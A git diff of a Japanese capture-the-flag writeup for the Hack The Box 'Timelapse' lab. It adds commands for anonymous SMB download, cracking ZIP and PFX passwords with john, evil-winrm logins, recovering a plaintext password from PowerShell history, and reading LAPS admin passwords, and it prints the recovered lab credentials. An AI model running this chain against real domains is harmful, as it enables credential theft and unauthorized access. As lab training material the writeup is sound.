@@ -60,13 +60,20 @@ smbclient -N //<RHOST>/Shares
 
 `ls`コマンドで、`Dev`と`HelpDesk`の２つのフォルダが見つかりました。
 
+![img](smb_ls.png)
+
+
 `mget`コマンドで、`Shares`配下のファイルを一括ダウンロードします。
+
+```bash
+recurse on
+prompt off
+mget *
+```
 
 `exit`コマンドで接続を終了します。
 
-<!--
-smbコマンドのスクショ
--->
+![alt text](image-6.png)
 
 <!--
 SYSVOLフォルダは？他のフォルダは？
@@ -75,9 +82,8 @@ SYSVOLフォルダは？他のフォルダは？
 ## ZIPファイルのパスワード解析
 
 `Dev`フォルダ配下に`winrm_backup.zip`が見つかります。ZIPファイルを展開してみると、パスワード入力が求められます。
-<!--
-ZIPファイル展開のスクショ
--->
+
+![alt text](image-2.png)
 
 まずは、`zip2john`でパスワードハッシュを抽出します。
 
@@ -97,12 +103,8 @@ john --wordlist=/usr/share/wordlists/rockyou.txt htb/timelapse/winrm_backup.hash
 
 ## PFXファイルのパスワード解析
 
-`winrm_backup.zip`を展開すると、PFXファイルが見つかります。
-このPFXファイルもパスワードで保護されています。
+`winrm_backup.zip`を展開すると、PFXファイルが見つかり、パスワードで保護されています。
 
-<!--
-ZIPファイル展開のスクショ
--->
 
 `pfx2john`でパスワードハッシュを抽出します。
 
@@ -137,11 +139,16 @@ key certでいいのか
 
 ## WinRM経由での接続
 
+```bash
+evil-winrm -c htb/timelapse/legacyy_dev_auth.cert -k htb/timelapse/legacyy_dev_auth.key -i <RHOST> -S
+```
 ![img](evil-winrm.png)
 
 ## userフラグの取得
 
 `legaccy`ユーザーの`Desktop`配下にuserフラグが見つかります。
+
+![alt text](image-3.png)
 
 `type`コマンドでフラグを表示します。
 
@@ -151,38 +158,55 @@ type Desktop/user.txt
 
 ## svc_deploy
 
+```bash
+type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
 <!--
 ConsoleHost_historyとは？
+
+whoami
+ipconfig /all
+netstat -ano |select-string LIST
+$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
+$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
+$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
+invoke-command -computername localhost -credential $c -port 5986 -usessl -
+SessionOption $so -scriptblock {whoami}
+get-aduser -filter * -properties *
+exit
+
+
 -->
 
 
-ユーザー名`svc_deploy`のパスワードが``であることがわかります。
+ユーザー名`svc_deploy`のパスワードが`E3R$Q62^12p7PLlC%KWaxuaV`であることがわかります。
 
 ![img](ConsoleHost_history.png)
 
 ## WinRM経由での接続
 
-<!--
-WinRMのスクしょ
--->
+
+```bash
+evil-winrm -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV' -i <RHOST> -S     
+```
+![alt text](image-4.png)
 
 ## ReadLAPSPassword
 
 `svc_deploy`が所属するグループを表示してみます。
 
-<!--
-svc_deployのグループ表示
--->
+![alt text](image-5.png)
 
-`LAPSReader`という名前のグループに所属していることがわかりました。
+`LAPS_Readers`という名前のグループに所属していることがわかりました。
 
 このグループ名から、LAPSパスワードを閲覧できることが推測できます。
 
 ```bash
-Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"
+Get-ADComputer -filter {ms-mcs-admpwdexpirationtime -like '*'} -prop 'ms-mcs-admpwd','ms-mcs-admpwdexpirationtime'
 ```
 
-参考：[ReadLAPSPassword | SpecterOps](https://bloodhound.specterops.io/resources/edges/read-laps-password)
+参考：[ReadLAPSPassword | The Hacker Recipes](https://www.thehacker.recipes/ad/movement/dacl/readlapspassword)
 
 パスワードが`Gp&/n0ibz2JRQ4{GSTJ);P;0`であることがわかります。
 
